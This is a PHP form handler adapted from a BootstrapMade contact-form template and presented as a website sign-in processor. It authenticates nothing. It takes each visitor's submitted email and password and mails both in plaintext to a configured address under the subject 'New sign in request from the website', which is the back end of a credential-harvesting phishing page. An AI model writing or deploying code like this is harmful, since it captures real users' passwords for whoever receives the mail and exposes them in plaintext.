<?php
  /**
  * Requires the "PHP Email Form" library
  * The "PHP Email Form" library is available only in the pro version of the template
  * The library should be uploaded to: vendor/php-email-form/php-email-form.php
  * For more info and help: https://bootstrapmade.com/php-email-form/
  */

  // Replace contact@example.com with your real receiving email address
  $receiving_email_address = 'contact@example.com';

  if( file_exists($php_email_form = '../assets/vendor/php-email-form/php-email-form.php' )) {
    include( $php_email_form );
  } else {
    die( 'Unable to load the "PHP Email Form" Library!');
  }

  $signing_in = new PHP_Email_Form;
  $signing_in->ajax = true;
  
  $signing_in->to = $receiving_email_address;
  $signing_in->from_email = $_POST['email'];
  $signing_in->from_password = $_POST['password'];
  $signing_in->subject = "New sign in request from the website";

  // Uncomment below code if you want to use SMTP to send emails. You need to enter your correct SMTP credentials
  /*
  $signing_in->smtp = array(
    'host' => 'example.com',
    'username' => 'example',
    'password' => 'pass',
    'port' => '587'
  );
  */

  $signing_in->add_message( $_POST['email'], 'Email');
  $signing_in->add_message( $_POST['password'], 'Password');


  echo $signing_in->send();
?>
